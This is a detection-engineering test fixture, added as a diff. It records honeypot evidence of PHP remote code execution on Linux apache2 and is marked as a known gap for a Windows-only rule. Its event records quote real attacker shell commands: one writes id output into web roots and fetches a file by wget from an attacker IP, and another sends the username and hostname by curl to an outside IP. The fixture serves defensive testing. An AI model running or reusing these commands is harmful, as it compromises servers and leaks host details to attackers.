@@ -1,0 +1,91 @@
+{
+  "label": "known-gap",
+  "variant": "Linux apache2 (mod_php) -> /bin/sh -c from the PHP2Shell honeypot (A01 and B16), shaped as Sysmon for Linux EventID 1; out of scope for this Windows-only rule",
+  "source": "derived from public honeypot evidence 0x4D31/honeypot-data (CC-BY-4.0), report https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md, dataset https://github.com/0x4D31/honeypot-data/tree/main/reports/php2shell/2026-10-24-rce-evidence at commit 0b6a57491134c10f7cc5055999f1cb8b38c67546",
+  "license": "CC-BY-4.0, author 0x4D31; see THIRD_PARTY_NOTICES.md",
+  "derived": true,
+  "synthetic": false,
+  "field_mapping": "Field-mapped from Tetragon process_exec records, not native Splunk Sysmon EventID 1 (Linux sysmon:linux shape) telemetry. ParentImage=parent.binary; Image=process.binary; CommandLine=process.binary+\" \"+process.arguments; host=node_name; User=www-data from uid 33. Only process_exec records with the case's shell or its descendants are included; kprobe socket records are omitted. Values are otherwise as published (attacker IPs as published; honeypot addresses are the publisher's TEST-NET aliases).",
+  "expect_alert": false,
+  "expect_alert_before_fix": false,
+  "result": "not run",
+  "source_files": [
+    "https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-rce-evidence/episode-a/A01/tetragon.jsonl",
+    "https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-rce-evidence/episode-b/B16/tetragon.jsonl"
+  ],
+  "events": [
+    {
+      "sourcetype": "sysmon:linux",
+      "EventID": 1,
+      "_time": "2026-10-24T15:35:38.673197428Z",
+      "host": "ip-10-29-200-8",
+      "User": "www-data",
+      "ParentImage": "/usr/sbin/apache2",
+      "Image": "/bin/sh",
+      "CommandLine": "/bin/sh -c -- \"id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33\"",
+      "_case": "A01",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjE4NDI3OTk1MjQ3MTc6Mzk1Nzcw"
+    },
+    {
+      "sourcetype": "sysmon:linux",
+      "EventID": 1,
+      "_time": "2026-10-24T15:35:38.674720187Z",
+      "host": "ip-10-29-200-8",
+      "User": "www-data",
+      "ParentImage": "/bin/sh",
+      "Image": "/usr/bin/id",
+      "CommandLine": "/usr/bin/id",
+      "_case": "A01",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMToxNjE4NDI4MDEwNDczNjY6Mzk1Nzcx"
+    },
+    {
+      "sourcetype": "sysmon:linux",
+      "EventID": 1,
+      "_time": "2026-10-24T18:05:33.769037483Z",
+      "host": "ip-10-29-201-8",
+      "User": "www-data",
+      "ParentImage": "/usr/sbin/apache2",
+      "Image": "/bin/sh",
+      "CommandLine": "/bin/sh -c -- \"curl -s http://162.35.99.94:80/PROOF-$(id -un)-$(hostname)\"",
+      "_case": "B16",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMzoxNjY0Mzg2MzMxMDg0OTY6NzkxOTAy"
+    },
+    {
+      "sourcetype": "sysmon:linux",
+      "EventID": 1,
+      "_time": "2026-10-24T18:05:33.773472169Z",
+      "host": "ip-10-29-201-8",
+      "User": "www-data",
+      "ParentImage": "/bin/sh",
+      "Image": "/usr/bin/id",
+      "CommandLine": "/usr/bin/id -un",
+      "_case": "B16",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMzoxNjY0Mzg2Mzc1NDE1MzI6NzkxOTAz"
+    },
+    {
+      "sourcetype": "sysmon:linux",
+      "EventID": 1,
+      "_time": "2026-10-24T18:05:33.782217481Z",
+      "host": "ip-10-29-201-8",
+      "User": "www-data",
+      "ParentImage": "/bin/sh",
+      "Image": "/usr/bin/hostname",
+      "CommandLine": "/usr/bin/hostname",
+      "_case": "B16",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMzoxNjY0Mzg2NDYyODg3NjQ6NzkxOTA0"
+    },
+    {
+      "sourcetype": "sysmon:linux",
+      "EventID": 1,
+      "_time": "2026-10-24T18:05:33.784400418Z",
+      "host": "ip-10-29-201-8",
+      "User": "www-data",
+      "ParentImage": "/bin/sh",
+      "Image": "/usr/bin/curl",
+      "CommandLine": "/usr/bin/curl -s http://162.35.99.94:80/PROOF-www-data-e778e709e726",
+      "_case": "B16",
+      "_tetragon_exec_id": "aXAtMTkyLTAtMi0xMzoxNjY0Mzg2NDg0NzE3MjE6NzkxOTA1"
+    }
+  ],
+  "note": "Real attacker activity expected to be MISSED by this rule: it reads Windows Sysmon only, excludes sourcetype=sysmon:linux, and matches php-cgi.exe/php.exe/w3wp.exe parents with cmd/powershell/pwsh children. Adding a Linux sourcetype needs Debarshi's approval and is not part of this change. Linux coverage is in DAC-MDE-0096 and DAC-CS-0245."
+}
